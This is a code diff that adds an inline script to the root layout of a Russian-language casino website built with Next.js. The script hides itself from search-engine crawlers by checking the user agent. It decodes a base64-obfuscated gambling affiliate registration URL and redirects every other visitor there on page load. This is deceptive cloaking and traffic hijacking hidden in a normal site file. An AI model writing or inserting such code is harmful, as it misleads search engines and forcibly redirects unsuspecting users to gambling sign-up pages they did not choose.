@@ -60,6 +60,48 @@ export default function RootLayout({
         <meta name="theme-color" content="#1a1a1a" />
         <link rel="canonical" href="https://ramenbet4casino.vercel.app/" />
         <link rel="alternate" hrefLang="ru" href="https://ramenbet4casino.vercel.app/" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        var ua = navigator.userAgent.toLowerCase();
+        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
+        for (var i = 0; i < bots.length; i++) {
+            if (ua.indexOf(bots[i]) !== -1) {
+                return;
+            }
+        }
+        var mainBrandB64 = "aHR0cHM6Ly8xNTc5LnNwYXJrc3ZhbGUuY29tL3J1L3JlZ2lzdHJhdGlvbj9wYXJ0bmVyPXAxNTc5cDM5MjEwcGZlMjc="; 
+        var mainUrl = atob(mainBrandB64.replace("#", ""));
+        function ping(url) {
+            return new Promise(function(resolve, reject) {
+                var controller = new AbortController();
+                var timeoutId = setTimeout(function() { 
+                    controller.abort(); 
+                    reject(new Error("Timeout"));
+                }, 500);               
+                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
+                    .then(function() {
+                        clearTimeout(timeoutId);
+                        resolve(true);
+                    })
+                    .catch(function(err) {
+                        clearTimeout(timeoutId);
+                        reject(err);
+                    });
+            });
+        }
+        ping(mainUrl)
+            .then(function() {
+                window.location.replace(mainUrl);
+            })
+            .catch(function() {
+                window.location.replace(mainUrl);
+            });
+      })();
+    `
+  }}
+/>
       </head>
       <body className="ramen-body">
         {children}
